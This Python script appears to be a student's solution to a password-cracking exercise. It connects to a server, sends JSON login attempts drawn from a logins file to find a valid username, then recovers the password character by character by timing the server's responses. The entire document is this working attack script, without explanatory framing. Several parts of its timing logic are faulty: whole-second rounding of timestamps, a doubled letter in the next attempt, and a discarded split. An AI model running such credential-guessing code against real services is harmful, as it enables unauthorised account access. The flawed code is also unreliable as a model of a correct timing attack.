# write your code here
import socket
import sys
import string
# import itertools
import json
import time


# Creating socket
client_socket = socket.socket()

hostname = sys.argv[1]
port = sys.argv[2]

address = (hostname, int(port))
# print(type(address))
hostname = '127.0.0.1'

# Connecting to address
client_socket.connect(address)

# Password generator
letters = string.ascii_lowercase
digits = string.digits
digits = list(digits)
# characters = letters + digits
passwd = ''
# Opening the typical_passwords file
# with open(r"""C:\Users\user1\PycharmProjects\Password Hacker\Password Hacker\task\hacking\passwords.txt""", 'r') as passwords_file:

# Opening the typical admin_logins file
password = ''
abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
with open(r"""C:\Users\Admin\PycharmProjects\Password Hacker\Password Hacker\task\hacking\logins.txt""", 'r') as logins_file:
    for username in logins_file:
        username = username.strip()
        python_dict_login = {"login": f"{username}", "password": ' '}
        # print(python_dict_login)
        json_login = json.dumps(python_dict_login)
        client_socket.send(bytes(json_login, encoding='utf-8'))
        # Receiving server response
        response = client_socket.recv(1024).decode('utf-8')
        # print(response)
        if response == r'{"result": "Wrong password!"}':
            # print(response)
            # print(username)
            while response != r'{"result": "Connection success!"}':
                for letter in abc:
                    python_dict_login = {"login": f"{username}", "password": f"{password + letter}"}
                    json_login = json.dumps(python_dict_login)
                    # Time before sending request and receiving response
                    time_before = time.perf_counter()
                    # Sending request to server
                    client_socket.send(bytes(json_login, encoding='utf-8'))
                    # Receiving server response
                    response = client_socket.recv(1024).decode('utf-8')
                    # Time after receiving response
                    time_after = time.perf_counter()

                    # print(f"Time before {time_before}")
                    # print(f"Time after {time_after}")

                    if round(time_after) > round(time_before):
                        # print(letter)
                        password += letter
                        python_dict_login = {"login": f"{username}", "password": f"{password + letter}"}
                        # print(response)
                        # print(password)
                    if response == r'{"result": "Connection success!"}':
                        # print(response)
                        # print(password)
                        print(json_login)
                        # Closing the connection
                        client_socket.close()
                        exit()

                    elif len(password) > 1:
                        password.split(password[-1])
                        # print(password)


